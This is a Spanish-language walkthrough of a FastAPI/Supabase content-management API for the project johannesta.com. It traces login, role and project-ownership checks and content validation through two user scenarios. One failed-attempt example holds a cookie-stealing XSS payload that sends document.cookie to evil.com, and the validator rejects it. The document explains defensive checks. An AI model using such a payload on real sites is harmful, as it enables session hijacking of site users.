# Casos de Escritorio — Flujos de Usuario

Dos escenarios reales que muestran paso a paso cómo el sistema procesa cada petición, incluyendo las validaciones de seguridad en cada capa.

**Contexto:** El proyecto es `johannesta.com` con `project_id = "abc-123"`.

Usuarios del proyecto:
- **María** — rol `editor`, gestiona el contenido
- **Carlos** — rol `owner`, administra el proyecto

---

## Caso 1: María actualiza la sección toolkit

María quiere reemplazar la lista de herramientas de la página pública.

---

### Paso 1.1 — Login

```http
POST /auth/login
Content-Type: application/json

{
  "email": "maria@johannesta.com",
  "password": "Secure2025"
}
```

**Lo que ocurre internamente:**

```
1. slowapi verifica: ¿esta IP superó 5 intentos en el último minuto?
   └── No → continuar

2. SELECT id, project_id, role, hashed_password
   FROM admins WHERE email = 'maria@johannesta.com'
   └── Registro encontrado

3. bcrypt.verify("Secure2025", hash_de_maría)
   └── ✅ Correcto

4. Genera JWT:
   {
     "sub": "uuid-maria",
     "project_id": "abc-123",
     "role": "editor",
     "exp": ahora + 1h
   }
```

**Respuesta:**

```http
HTTP 200
{
  "access_token": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1dWlkLW1hcmlhIiwicHJvamVjdF9pZCI6ImFiYy0xMjMiLCJyb2xlIjoiZWRpdG9yIn0...",
  "token_type": "bearer"
}
```

> **Nota sobre timing:** Si el email no existiera, FastAPI ejecutaría bcrypt contra un hash dummy antes de responder. La respuesta tarda lo mismo independientemente de si el email existe o no. Un atacante no puede saber qué emails están registrados midiendo tiempos.

> **Si falla el rate limit:**
> ```http
> HTTP 429 Too Many Requests
> { "error": "Rate limit exceeded: 5 per 1 minute" }
> ```

---

### Paso 1.2 — Actualizar toolkit

María envía la nueva lista de herramientas con el token recibido.

```http
PUT /sections/abc-123/toolkit
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
Content-Type: application/json

{
  "content_json": {
    "tools": ["Python", "FastAPI", "React", "Supabase", "Docker"]
  }
}
```

**Lo que ocurre internamente:**

```
1. HTTPBearer extrae el token del header Authorization

2. get_current_user decodifica el JWT con jwt_secret
   └── Payload: { role: "editor", project_id: "abc-123", sub: "uuid-maria" }
   └── ¿Expiró? → No (lleva 2 minutos activo)

3. require_role("owner", "editor") verifica:
   └── ¿"editor" está en ("owner", "editor")? → ✅

4. assert_project_ownership verifica:
   └── ¿JWT project_id ("abc-123") == URL project_id ("abc-123")? → ✅

5. ¿"toolkit" está en VALID_SECTION_TYPES? → ✅

6. validate_section_content("toolkit", { "tools": [...] }):
   └── ¿Lista tiene <= 50 elementos? 5 <= 50 → ✅
   └── ¿Cada nombre tiene <= 100 chars? Sí → ✅

7. SELECT id FROM sections
   WHERE project_id = 'abc-123' AND type = 'toolkit'
   └── Encontrado → continuar

8. UPDATE sections
   SET content_json = '{"tools": ["Python","FastAPI","React","Supabase","Docker"]}'
   WHERE project_id = 'abc-123' AND type = 'toolkit'
```

**Respuesta:**

```http
HTTP 200
{
  "id": "uuid-seccion-toolkit",
  "project_id": "abc-123",
  "type": "toolkit",
  "content_json": {
    "tools": ["Python", "FastAPI", "React", "Supabase", "Docker"]
  }
}
```

Los visitantes que llamen a `GET /sections/abc-123` verán la nueva lista inmediatamente.

---

### Intentos fallidos de María

**María intenta borrar un bloque:**

```http
DELETE /blocks/abc-123/block-uuid-001
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
```

```
require_role("owner") verifica: ¿"editor" está en ("owner")? → ❌
```

```http
HTTP 403
{ "detail": "Permisos insuficientes" }
```

**María intenta modificar el toolkit de otro proyecto:**

```http
PUT /sections/xyz-999/toolkit
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
```

```
assert_project_ownership: ¿"abc-123" == "xyz-999"? → ❌
```

```http
HTTP 403
{ "detail": "Acceso denegado" }
```

**María intenta subir un toolkit con 60 herramientas:**

```http
PUT /sections/abc-123/toolkit
{
  "content_json": {
    "tools": ["tool1", "tool2", ..., "tool60"]
  }
}
```

```
validate_section_content: ¿60 <= 50? → ❌
```

```http
HTTP 422
{ "detail": "content_json inválido para sección 'toolkit': La lista de herramientas no puede superar 50 elementos" }
```

---

## Caso 2: Carlos publica, edita y borra un bloque

Carlos ya tiene su token activo (lo obtuvo hace 15 minutos, expira en 45 minutos).

Payload del JWT de Carlos: `{ sub: "uuid-carlos", project_id: "abc-123", role: "owner" }`.

---

### Paso 2.1 — Crear el bloque (borrador)

Carlos crea el bloque como borrador (`visible: false`) para revisarlo antes de publicar.

```http
POST /blocks/abc-123
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
Content-Type: application/json

{
  "type": "text",
  "content_json": {
    "body": "## Bienvenidos\n\nEste es mi nuevo artículo sobre FastAPI."
  },
  "order": 5,
  "visible": false
}
```

**Lo que ocurre internamente:**

```
1. get_current_user → { role: "owner", project_id: "abc-123" }
2. require_role("owner", "editor") → ✅
3. assert_project_ownership → ✅
4. ¿"text" en VALID_TYPES? → ✅
5. validate_content_json("text", { "body": "## Bienvenidos..." }):
   └── Longitud: 54 chars < 50.000 → ✅
   └── Sin tags HTML → ✅
   └── Sin "javascript:" → ✅
6. INSERT INTO blocks (project_id, type, content_json, order, visible)
   VALUES ('abc-123', 'text', '{"body":"..."}', 5, false)
```

**Respuesta:**

```http
HTTP 201
{
  "id": "block-uuid-nuevo",
  "project_id": "abc-123",
  "type": "text",
  "content_json": {
    "body": "## Bienvenidos\n\nEste es mi nuevo artículo sobre FastAPI."
  },
  "order": 5,
  "visible": false,
  "created_at": "2026-03-06T14:00:00Z"
}
```

En este momento:
- `GET /blocks/abc-123` (endpoint público) → el bloque **NO** aparece (`visible=false`)
- `GET /blocks/abc-123/admin/all` (panel admin) → el bloque **SÍ** aparece

---

### Paso 2.2 — Editar el bloque y publicarlo

Carlos corrige una palabra y lo publica cambiando `visible` a `true`. Solo envía los campos que cambian.

```http
PUT /blocks/abc-123/block-uuid-nuevo
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
Content-Type: application/json

{
  "content_json": {
    "body": "## Bienvenidos\n\nEste es mi primer artículo publicado sobre FastAPI."
  },
  "visible": true
}
```

**Lo que ocurre internamente:**

```
1. get_current_user → { role: "owner", project_id: "abc-123" }
2. require_role("owner", "editor") → ✅
3. assert_project_ownership → ✅
4. SELECT id, type FROM blocks
   WHERE id = 'block-uuid-nuevo' AND project_id = 'abc-123'
   └── Encontrado: { id: "block-uuid-nuevo", type: "text" }
5. body.model_dump(exclude_none=True):
   └── { content_json: {...}, visible: true }
   └── type y order NO están en el dict → no se tocan en DB
6. Tipo efectivo: body.type es None → usa el del bloque: "text"
7. validate_content_json("text", { "body": "..." }) → ✅
8. UPDATE blocks
   SET content_json = '{"body":"..."}', visible = true
   WHERE id = 'block-uuid-nuevo'
```

**Respuesta:**

```http
HTTP 200
{
  "id": "block-uuid-nuevo",
  "project_id": "abc-123",
  "type": "text",
  "content_json": {
    "body": "## Bienvenidos\n\nEste es mi primer artículo publicado sobre FastAPI."
  },
  "order": 5,
  "visible": true,
  "created_at": "2026-03-06T14:00:00Z"
}
```

A partir de este momento `GET /blocks/abc-123` incluye el bloque en la posición 5.

---

### Paso 2.3 — Borrar el bloque

Carlos decide eliminar el artículo.

```http
DELETE /blocks/abc-123/block-uuid-nuevo
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
```

**Lo que ocurre internamente:**

```
1. get_current_user → { role: "owner", project_id: "abc-123" }
2. require_role("owner") → ✅  ← solo owner puede borrar
3. assert_project_ownership → ✅
4. SELECT id FROM blocks
   WHERE id = 'block-uuid-nuevo' AND project_id = 'abc-123'
   └── Encontrado
5. DELETE FROM blocks WHERE id = 'block-uuid-nuevo'
```

**Respuesta:**

```http
HTTP 204 No Content
(sin body)
```

---

### Intentos fallidos de Carlos

**Carlos intenta eliminarse a sí mismo del proyecto:**

```http
DELETE /admins/abc-123/uuid-carlos
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
```

```
user["sub"] ("uuid-carlos") == admin_id ("uuid-carlos") → ❌
```

```http
HTTP 400
{ "detail": "No puedes eliminarte a ti mismo" }
```

**Carlos intenta crear un admin con rol owner:**

```http
POST /admins/abc-123
{
  "email": "nuevo@johannesta.com",
  "password": "SecurePass1",
  "role": "owner"
}
```

```
¿"owner" en VALID_ROLES {"editor", "viewer"}? → ❌
```

```http
HTTP 422
{ "detail": "Rol inválido: 'owner'. Permitidos: ['editor', 'viewer']" }
```

**Carlos intenta subir un bloque con XSS:**

```http
POST /blocks/abc-123
{
  "type": "text",
  "content_json": {
    "body": "<script>fetch('https://evil.com?c='+document.cookie)</script>"
  },
  "order": 1
}
```

```
validate_body: re.search(r'<[^>]+>', body) → ❌ encontró tag HTML
```

```http
HTTP 422
{ "detail": "content_json inválido para tipo 'text': El contenido no puede incluir etiquetas HTML" }
```

---

## Tabla resumen de validaciones por capa

```
Petición HTTP
    │
    ├── 1. HTTPBearer: ¿hay token en el header?
    │       └── No → 401
    │
    ├── 2. get_current_user: ¿el token es válido y no expiró?
    │       └── Expirado → 401
    │       └── Firma inválida → 401
    │
    ├── 3. require_role: ¿el rol del token está en los roles permitidos?
    │       └── No → 403
    │
    ├── 4. assert_project_ownership: ¿el project_id del token == el de la URL?
    │       └── No → 403
    │
    ├── 5. Pydantic (body): ¿el payload cumple el esquema?
    │       └── Tipo inválido → 422
    │       └── Campo requerido ausente → 422
    │       └── URL malformada → 422
    │       └── HTML/javascript en body → 422
    │       └── Longitud excedida → 422
    │
    ├── 6. Lógica de negocio: ¿el recurso existe en DB?
    │       └── No → 404
    │       └── Email duplicado → 409
    │       └── Auto-eliminación → 400
    │
    └── 7. Query a Supabase → respuesta
```
